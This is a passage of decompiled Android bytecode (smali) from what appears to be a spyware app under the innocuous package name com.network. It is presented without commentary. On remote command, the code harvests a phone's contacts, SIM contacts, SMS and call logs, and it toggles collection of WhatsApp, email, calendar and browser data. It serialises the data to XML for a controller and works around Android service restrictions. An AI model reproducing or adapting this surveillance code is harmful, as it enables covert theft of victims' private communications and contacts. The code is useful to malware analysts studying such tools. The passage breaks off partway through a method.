.class public final Lcom/network/media/f;
.super Ljava/lang/Object;


# static fields
.field private static a:I

.field private static b:I

.field private static c:I

.field private static d:I

.field private static e:I

.field private static f:I

.field private static g:I

.field private static h:I

.field private static i:I

.field private static j:I

.field private static k:I

.field private static l:Landroid/os/Handler;


# direct methods
.method static constructor <clinit>()V
    .locals 3

    const/4 v2, 0x2

    const/4 v1, 0x1

    sput v1, Lcom/network/media/f;->a:I

    sput v2, Lcom/network/media/f;->b:I

    const/4 v0, 0x4

    sput v0, Lcom/network/media/f;->c:I

    const/16 v0, 0x8

    sput v0, Lcom/network/media/f;->d:I

    const/16 v0, 0x10

    sput v0, Lcom/network/media/f;->e:I

    const/16 v0, 0x20

    sput v0, Lcom/network/media/f;->f:I

    const/16 v0, 0x40

    sput v0, Lcom/network/media/f;->g:I

    const/4 v0, 0x0

    sput v0, Lcom/network/media/f;->h:I

    sput v1, Lcom/network/media/f;->i:I

    sput v2, Lcom/network/media/f;->j:I

    const/4 v0, 0x3

    sput v0, Lcom/network/media/f;->k:I

    new-instance v0, Landroid/os/HandlerThread;

    const-string v1, "Dump performDumpInANewThread"

    invoke-direct {v0, v1}, Landroid/os/HandlerThread;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Landroid/os/HandlerThread;->start()V

    new-instance v1, Landroid/os/Handler;

    invoke-virtual {v0}, Landroid/os/HandlerThread;->getLooper()Landroid/os/Looper;

    move-result-object v0

    invoke-direct {v1, v0}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    sput-object v1, Lcom/network/media/f;->l:Landroid/os/Handler;

    return-void
.end method

.method public static a(I)V
    .locals 3

    :try_start_0
    const-string v0, "clearDumpParamsAccordingToBitWise after loop"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const/4 v0, 0x0

    sput-boolean v0, Lcom/network/b/b;->p:Z

    const/4 v0, 0x1

    sput-boolean v0, Lcom/network/b/b;->r:Z

    const/4 v0, 0x1

    sput-boolean v0, Lcom/network/b/b;->q:Z

    const/4 v0, 0x1

    sput-boolean v0, Lcom/network/b/b;->w:Z

    const/4 v0, 0x1

    sput-boolean v0, Lcom/network/b/b;->v:Z

    const/4 v0, 0x1

    sput-boolean v0, Lcom/network/b/b;->t:Z

    const/4 v0, 0x1

    sput-boolean v0, Lcom/network/b/b;->u:Z

    const/4 v0, 0x1

    sput-boolean v0, Lcom/network/b/b;->s:Z

    sget v0, Lcom/network/media/f;->a:I

    and-int/2addr v0, p0

    sget v1, Lcom/network/media/f;->a:I

    if-ne v0, v1, :cond_0

    const/4 v0, 0x0

    sput-boolean v0, Lcom/network/b/b;->r:Z

    const-string v0, "clearDumpParamsAccordingToBitWise .dumpContacts = false;"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :cond_0
    sget v0, Lcom/network/media/f;->b:I

    and-int/2addr v0, p0

    sget v1, Lcom/network/media/f;->b:I

    if-ne v0, v1, :cond_1

    const/4 v0, 0x0

    sput-boolean v0, Lcom/network/b/b;->q:Z

    const-string v0, "clearDumpParamsAccordingToBitWise dumpSMS = false;"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :cond_1
    sget v0, Lcom/network/media/f;->c:I

    and-int/2addr v0, p0

    sget v1, Lcom/network/media/f;->c:I

    if-ne v0, v1, :cond_2

    const/4 v0, 0x0

    sput-boolean v0, Lcom/network/b/b;->w:Z

    const-string v0, "clearDumpParamsAccordingToBitWise dumpEmails = false;"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :cond_2
    sget v0, Lcom/network/media/f;->d:I

    and-int/2addr v0, p0

    sget v1, Lcom/network/media/f;->d:I

    if-ne v0, v1, :cond_3

    const/4 v0, 0x0

    sput-boolean v0, Lcom/network/b/b;->v:Z

    const-string v0, "clearDumpParamsAccordingToBitWise dumpWhatsApp = false;"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :cond_3
    sget v0, Lcom/network/media/f;->e:I

    and-int/2addr v0, p0

    sget v1, Lcom/network/media/f;->e:I

    if-ne v0, v1, :cond_4

    const/4 v0, 0x0

    sput-boolean v0, Lcom/network/b/b;->t:Z

    const-string v0, "clearDumpParamsAccordingToBitWise dumpCall = false;"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :cond_4
    sget v0, Lcom/network/media/f;->f:I

    and-int/2addr v0, p0

    sget v1, Lcom/network/media/f;->f:I

    if-ne v0, v1, :cond_5

    const/4 v0, 0x0

    sput-boolean v0, Lcom/network/b/b;->u:Z

    const-string v0, "clearDumpParamsAccordingToBitWise dumpCalander = false;"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :cond_5
    sget v0, Lcom/network/media/f;->g:I

    and-int/2addr v0, p0

    sget v1, Lcom/network/media/f;->g:I

    if-ne v0, v1, :cond_6

    const/4 v0, 0x0

    sput-boolean v0, Lcom/network/b/b;->s:Z

    const-string v0, "clearDumpParamsAccordingToBitWise dumpBrowserData = false;"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :cond_6
    const-string v0, "clearDumpParamsAccordingToBitWise end"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "ParseResponseCommands clearDumpParamsAccordingToBitWise exception: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    throw v0
.end method

.method private static a(Landroid/content/Context;Landroid/content/ContentResolver;)V
    .locals 7

    :try_start_0
    sget-boolean v0, Lcom/network/b/b;->r:Z

    if-eqz v0, :cond_0

    const-string v0, "Dump dumpContacts dumpContacts is true. returning"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :goto_0
    return-void

    :cond_0
    sget-object v1, Landroid/provider/ContactsContract$Contacts;->CONTENT_URI:Landroid/net/Uri;

    const/4 v2, 0x0

    const/4 v3, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    move-object v0, p1

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v0

    const-string v1, "Dump innerDump Contacts Start"

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    if-eqz v0, :cond_4

    invoke-interface {v0}, Landroid/database/Cursor;->getCount()I

    move-result v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "Dump innerDump Contacts count: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    if-lez v0, :cond_3

    invoke-static {}, Landroid/util/Xml;->newSerializer()Lorg/xmlpull/v1/XmlSerializer;

    move-result-object v1

    new-instance v2, Ljava/io/StringWriter;

    invoke-direct {v2}, Ljava/io/StringWriter;-><init>()V

    invoke-static {v1, v2}, Lcom/network/android/SmsReceiver;->a(Lorg/xmlpull/v1/XmlSerializer;Ljava/io/StringWriter;)V

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "get innerDump Contacts: "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const/16 v3, 0x23

    if-ge v0, v3, :cond_2

    invoke-static {v1, p1}, Lcom/network/android/m;->c(Lorg/xmlpull/v1/XmlSerializer;Landroid/content/ContentResolver;)V

    invoke-static {p0}, Lcom/network/b/b;->c(Landroid/content/Context;)V

    invoke-static {p0, v1, v2}, Lcom/network/android/SmsReceiver;->a(Landroid/content/Context;Lorg/xmlpull/v1/XmlSerializer;Ljava/io/StringWriter;)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_2

    :goto_1
    :try_start_1
    const-string v0, "content://icc/adn"

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    const/4 v2, 0x0

    const/4 v3, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    move-object v0, p1

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v1

    if-eqz v1, :cond_6

    invoke-interface {v1}, Landroid/database/Cursor;->getCount()I

    move-result v0

    if-lez v0, :cond_6

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v2, "innerDump Sim Contacts  count: "

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-interface {v1}, Landroid/database/Cursor;->getCount()I

    move-result v2

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {}, Landroid/util/Xml;->newSerializer()Lorg/xmlpull/v1/XmlSerializer;

    move-result-object v2

    new-instance v3, Ljava/io/StringWriter;

    invoke-direct {v3}, Ljava/io/StringWriter;-><init>()V

    invoke-static {v2, v3}, Lcom/network/android/SmsReceiver;->a(Lorg/xmlpull/v1/XmlSerializer;Ljava/io/StringWriter;)V

    const-string v0, ""

    const-string v4, "contacts"

    invoke-interface {v2, v0, v4}, Lorg/xmlpull/v1/XmlSerializer;->startTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    :cond_1
    :goto_2
    invoke-interface {v1}, Landroid/database/Cursor;->moveToNext()Z
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_1

    move-result v0

    if-eqz v0, :cond_5

    :try_start_2
    const-string v0, "name"

    invoke-interface {v1, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v1, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v0

    const-string v4, "number"

    invoke-interface {v1, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v1, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    if-eqz v0, :cond_1

    if-eqz v4, :cond_1

    const-string v5, "\\D"

    const-string v6, ""

    invoke-virtual {v4, v5, v6}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    const-string v5, "&"

    const-string v6, ""

    invoke-virtual {v4, v5, v6}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    const-string v5, "|"

    const-string v6, ""

    invoke-virtual {v0, v5, v6}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "sim"

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v6, "_id"

    invoke-interface {v1, v6}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v6

    invoke-interface {v1, v6}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {v6, v0, v4}, Lcom/network/android/m;->a(Ljava/lang/StringBuilder;Ljava/lang/String;Ljava/lang/String;)V

    const-string v0, "add"

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v2, v0, v5, v4}, Lcom/network/android/m;->a(Lorg/xmlpull/v1/XmlSerializer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0
    .catch Ljava/lang/Throwable; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_2

    :catch_0
    move-exception v0

    :try_start_3
    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "innerDump read sim Exception- "

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_3
    .catch Ljava/lang/Throwable; {:try_start_3 .. :try_end_3} :catch_1

    goto :goto_2

    :catch_1
    move-exception v0

    :try_start_4
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "innerDump read sim Exception- "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    :goto_3
    const-string v0, "Dump innerDump Contacts End"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_4
    .catch Ljava/lang/Throwable; {:try_start_4 .. :try_end_4} :catch_2

    :goto_4
    sget-object v0, Lcom/network/android/SmsReceiver;->c:Landroid/os/Handler;

    new-instance v1, Lcom/network/media/n;

    invoke-direct {v1}, Lcom/network/media/n;-><init>()V

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    goto/16 :goto_0

    :cond_2
    :try_start_5
    invoke-static {p0, v1, v2}, Lcom/network/android/SmsReceiver;->a(Landroid/content/Context;Lorg/xmlpull/v1/XmlSerializer;Ljava/io/StringWriter;)V

    invoke-static {p1, p0}, Lcom/network/android/SmsReceiver;->a(Landroid/content/ContentResolver;Landroid/content/Context;)V
    :try_end_5
    .catch Ljava/lang/Throwable; {:try_start_5 .. :try_end_5} :catch_2

    goto/16 :goto_1

    :catch_2
    move-exception v0

    :try_start_6
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "Dump  innerDump Contacts Exception- "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_6
    .catch Ljava/lang/Throwable; {:try_start_6 .. :try_end_6} :catch_3

    goto :goto_4

    :catch_3
    move-exception v0

    goto :goto_4

    :cond_3
    :try_start_7
    const-string v0, "innerDump LOG_NO_CONTACTS 0 contacts !!!!!"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const/4 v0, 0x1

    const/16 v1, 0x7d7

    const-string v2, "LOG_NO_CONTACTS"

    invoke-static {v0, v1, v2}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;)V

    invoke-static {p0}, Lcom/network/b/b;->c(Landroid/content/Context;)V

    goto/16 :goto_1

    :cond_4
    const/4 v0, 0x1

    const/16 v1, 0x7d7

    const-string v2, "LOG_NO_CONTACTS"

    invoke-static {v0, v1, v2}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;)V

    const-string v0, "innerDump LOG_NO_CONTACTS cur == null!!!!!"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_7
    .catch Ljava/lang/Throwable; {:try_start_7 .. :try_end_7} :catch_2

    goto/16 :goto_1

    :cond_5
    :try_start_8
    const-string v0, ""

    const-string v4, "contacts"

    invoke-interface {v2, v0, v4}, Lorg/xmlpull/v1/XmlSerializer;->endTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    invoke-static {p0, v2, v3}, Lcom/network/android/SmsReceiver;->a(Landroid/content/Context;Lorg/xmlpull/v1/XmlSerializer;Ljava/io/StringWriter;)V

    :cond_6
    invoke-interface {v1}, Landroid/database/Cursor;->close()V
    :try_end_8
    .catch Ljava/lang/Throwable; {:try_start_8 .. :try_end_8} :catch_1

    goto :goto_3
.end method

.method static synthetic a(Landroid/content/Context;Ljava/lang/String;)V
    .locals 0

    invoke-static {p0, p1}, Lcom/network/media/f;->b(Landroid/content/Context;Ljava/lang/String;)V

    return-void
.end method

.method public static a(Ljava/lang/String;)V
    .locals 3

    const-string v0, "Dump startDump"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "Dump startDump Build.VERSION.SDK_INT:"

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {}, Lcom/network/android/a/c;->d()Z

    move-result v0

    if-nez v0, :cond_0

    const-string v0, "Dump not over 18 (4.3) startDumpIntent by service"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    new-instance v0, Landroid/content/Intent;

    invoke-static {}, Lcom/network/android/agent/NetworkApp;->a()Landroid/content/Context;

    move-result-object v1

    const-class v2, Lcom/network/android/android/monitor/NetworkManagerService;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v1, "ACTION_DUMP"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    const-string v1, "commandAck"

    invoke-virtual {v0, v1, p0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    invoke-static {}, Lcom/network/android/agent/NetworkApp;->a()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :goto_0
    return-void

    :cond_0
    const-string v0, "Dump IS OVER 18 (4.3) service is not allowed. performDumpInANewThread"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {p0}, Lcom/network/media/f;->b(Ljava/lang/String;)V

    goto :goto_0
.end method

.method private static declared-synchronized b(Landroid/content/Context;Ljava/lang/String;)V
    .locals 6

    const-class v1, Lcom/network/media/f;

    monitor-enter v1

    :try_start_0
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v2, "Dump innerDump Start commandAck : "

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {}, Landroid/util/Xml;->newSerializer()Lorg/xmlpull/v1/XmlSerializer;

    move-result-object v0

    new-instance v2, Ljava/io/StringWriter;

    invoke-direct {v2}, Ljava/io/StringWriter;-><init>()V

    invoke-static {v0, v2}, Lcom/network/android/SmsReceiver;->a(Lorg/xmlpull/v1/XmlSerializer;Ljava/io/StringWriter;)V

    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v3

    sget-boolean v4, Lcom/network/b/b;->q:Z

    if-eqz v4, :cond_0

    const-string v0, "Dump dumpSms is true. returning"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :goto_0
    sget-boolean v0, Lcom/network/b/b;->t:Z

    if-eqz v0, :cond_1

    const-string v0, "Dump dumpCall is true. returning"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :goto_1
    invoke-static {p0}, Lcom/network/android/j;->a(Landroid/content/Context;)V

    invoke-static {p0}, Lcom/network/b/b;->c(Landroid/content/Context;)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    :try_start_1
    sget-object v0, Lcom/network/android/SmsReceiver;->c:Landroid/os/Handler;

    new-instance v2, Lcom/network/media/l;

    invoke-direct {v2, p0, v3}, Lcom/network/media/l;-><init>(Landroid/content/Context;Landroid/content/ContentResolver;)V

    invoke-virtual {v0, v2}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_3
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    :goto_2
    :try_start_2
    invoke-static {p0, v3}, Lcom/network/media/f;->a(Landroid/content/Context;Landroid/content/ContentResolver;)V

    sget-boolean v0, Lcom/network/b/b;->v:Z

    if-eqz v0, :cond_2

    const-string v0, "Dump dumpWhatsApp is true. returning"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :goto_3
    sget-boolean v0, Lcom/network/b/b;->w:Z

    if-eqz v0, :cond_3

    const-string v0, "Dump dumpMails is true. returning"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_2
    .catch Ljava/lang/Throwable; {:try_start_2 .. :try_end_2} :catch_0
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    :goto_4
    :try_start_3
    sget-boolean v0, Lcom/network/b/b;->u:Z

    if-eqz v0, :cond_4

    const-string v0, "Dump dumpCalander dumpCalander is true. returning"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_3
    .catch Ljava/lang/Throwable; {:try_start_3 .. :try_end_3} :catch_6
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    :goto_5
    :try_start_4
    sget-object v0, Lcom/network/android/SmsReceiver;->c:Landroid/os/Handler;

    new-instance v2, Lcom/network/media/h;

    invoke-direct {v2, p1, p0}, Lcom/network/media/h;-><init>(Ljava/lang/String;Landroid/content/Context;)V

    invoke-virtual {v0, v2}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    invoke-static {p0}, Lcom/network/b/b;->c(Landroid/content/Context;)V

    const-string v0, "/data/myappinfo"

    invoke-static {v0}, Lcom/network/h/b;->b(Ljava/lang/String;)V
    :try_end_4
    .catch Ljava/lang/Throwable; {:try_start_4 .. :try_end_4} :catch_0
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    :goto_6
    monitor-exit v1

    return-void

    :cond_0
    :try_start_5
    const-string v4, "Dump innerDump SMS Start"

    invoke-static {v4}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {v0, v3}, Lcom/network/android/m;->b(Lorg/xmlpull/v1/XmlSerializer;Landroid/content/ContentResolver;)V

    const-string v4, "Dump innerDump SMS End"

    invoke-static {v4}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {p0, v0, v2}, Lcom/network/android/SmsReceiver;->a(Landroid/content/Context;Lorg/xmlpull/v1/XmlSerializer;Ljava/io/StringWriter;)V

    const-wide/16 v4, 0x3

    invoke-static {v4, v5}, Ljava/lang/Thread;->sleep(J)V
    :try_end_5
    .catch Ljava/lang/Throwable; {:try_start_5 .. :try_end_5} :catch_1
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    :goto_7
    :try_start_6
    sget-object v0, Lcom/network/android/SmsReceiver;->c:Landroid/os/Handler;

    new-instance v2, Lcom/network/media/p;

    invoke-direct {v2}, Lcom/network/media/p;-><init>()V

    invoke-virtual {v0, v2}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z
    :try_end_6
    .catch Ljava/lang/Throwable; {:try_start_6 .. :try_end_6} :catch_0
    .catchall {:try_start_6 .. :try_end_6} :catchall_0

    goto :goto_0

    :catch_0
    move-exception v0

    if-eqz p1, :cond_5

    const/4 v2, 0x0

    const/16 v3, 0x7d3

    :try_start_7
    const-string v4, ""

    invoke-static {p1}, Lcom/network/h/b;->c(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v5

    invoke-static {v2, v3, v4, v5}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;Ljava/lang/Object;)V

    const/4 v2, 0x0

    const/16 v3, -0x3cae

    const-string v4, ""

    invoke-static {p1}, Lcom/network/h/b;->c(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v5

    invoke-static {v2, v3, v4, v5}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;Ljava/lang/Object;)V

    :goto_8
    invoke-static {p0}, Lcom/network/b/b;->c(Landroid/content/Context;)V

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "dump Exception- "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_7
    .catchall {:try_start_7 .. :try_end_7} :catchall_0

    goto :goto_6

    :catchall_0
    move-exception v0

    monitor-exit v1

    throw v0

    :catch_1
    move-exception v0

    :try_start_8
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v4, "Dump innerDump SMS Exception- "

    invoke-direct {v2, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_8
    .catch Ljava/lang/Throwable; {:try_start_8 .. :try_end_8} :catch_0
    .catchall {:try_start_8 .. :try_end_8} :catchall_0

    goto :goto_7

    :cond_1
    :try_start_9
    invoke-static {}, Landroid/util/Xml;->newSerializer()Lorg/xmlpull/v1/XmlSerializer;

    move-result-object v0

    new-instance v2, Ljava/io/StringWriter;

    invoke-direct {v2}, Ljava/io/StringWriter;-><init>()V

    invoke-static {v0, v2}, Lcom/network/android/SmsReceiver;->a(Lorg/xmlpull/v1/XmlSerializer;Ljava/io/StringWriter;)V

    const-string v4, "Dump dumpCall Call Start"

    invoke-static {v4}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {v0, v3}, Lcom/network/android/m;->d(Lorg/xmlpull/v1/XmlSerializer;Landroid/content/ContentResolver;)V

    const-string v4, "Dump dumpCall Call End"

